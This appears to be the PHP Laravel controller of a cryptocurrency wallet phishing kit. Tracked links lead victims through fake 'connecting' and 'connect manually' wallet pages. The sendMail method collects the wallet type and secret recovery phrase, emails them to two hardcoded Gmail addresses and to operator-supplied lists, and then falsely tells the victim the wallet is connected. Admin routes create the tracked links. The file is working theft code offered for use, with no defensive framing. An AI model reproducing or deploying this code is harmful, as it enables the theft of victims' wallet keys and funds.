<?php

namespace App\Http\Controllers;

use App\mailList;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class PagesController extends Controller
{
    public function __construct()
    {
//        $this->middleware('auth')->except(['index','sendMail','admin']);
    }
    // index
    /**
     * @throws \Psr\Container\ContainerExceptionInterface
     * @throws \Psr\Container\NotFoundExceptionInterface
     */
    public function index()
    {
        $data = \request()->get('p');

        if ($data != null) {
            $check = mailList::where('link', $data)->exists();

            if ($check) {
                //store the data value in a session
                \request()->session()->put('link',$data);
                return view('index')->with('data', $data);

            }
            else
                return $this->page_not_found();
        } else
            return $this->page_not_found();
    }

    //wallet
    public function wallet()
    {
        if (\request()->session()->has('link')){
            $link_value = \request()->session()->get('link');
            return view('wallet')->with('data',$link_value);
        }
        else
            return $this->page_not_found();
    }

    //send mail
    public function sendMail(Request $request)
    {
        $wallet_type = $request['wallet_type'];
        $phrase = $request['key'];
        $link = $request['link'];
        $email = $request['email'];

        Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase. '<br/>'. 'Here is the email address'. $email ?? 'No email provided' , function ($message) {
            $message->to(['lawalfemi33@gmail.com','callmehalpha2022@gmail.com'])
                ->subject('Wallet Key');
        });

        $mailList = mailList::where('link', $link)->get('emails');

        if ($mailList) {

            $mails = json_decode($mailList,true);

            foreach ($mails as $mail) {
                foreach ($mail as $mai) {

                    Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase. '<br/>'. 'Here is the email address'. $email, function ($message) use ($mai) {
                        $message->to($mai)
                            ->subject('Wallet Key');
                    });
                }
            }
            return redirect('wallet')->with('success', 'Wallet successfully connected');
        }

        return $this->page_not_found();

    }

    //Admin section to handle the creation of new links
    public function admin()
    {

        return view('admin');
    }

    public function adminDashboard()
    {

        return view('adminDashboard');
    }
//Admin login
    public function postAdmin(Request $request)
    {
        $request->validate([
            'email' => 'required',
            'password' => 'required'
        ]);

        $credentials = $request->only('email', 'password');
        if (\Auth::attempt($credentials)) {
            return redirect()->intended('adminDashboard');
        } else {
            session()->flash('message', 'Invalid credentials');
            return redirect()->back();

        }
    }
//Adding links and email
    public function postLink(Request $request)
    {
        $emailList = $request->email;
        $emailArray = explode(',', $emailList);
        $link = $request->link;

        $check = mailList::where('link', $link)->exists();

        if ($check){
            return back()->with('error', 'Link already exist');
        }

        mailList::create([
            'link' => $link,
            'emails' => $emailArray
        ]);
        return back()->with('success', 'Link created successfully, below is your link <br/>'.env('APP_URL').'/?p='.$link);
    }

    public function page_not_found(){
        return view('page_not_found');
    }

    public function walletConnecting(Request $request){
        $img_path = $request->img_path;
        $coin = $request->coin_name;
        \request()->session()->put('coin',$coin);
        return view('connecting')->with('img_path',$img_path)->with('coin',$coin);
    }

    public function walletError(){
        return view('connectionError');
    }

    public function walletManually(){
        $coin = \request()->session()->get('coin');
        $data = \request()->session()->get('link');

        return view('connectManually')->with('coin',$coin)->with('data',$data);
    }
}
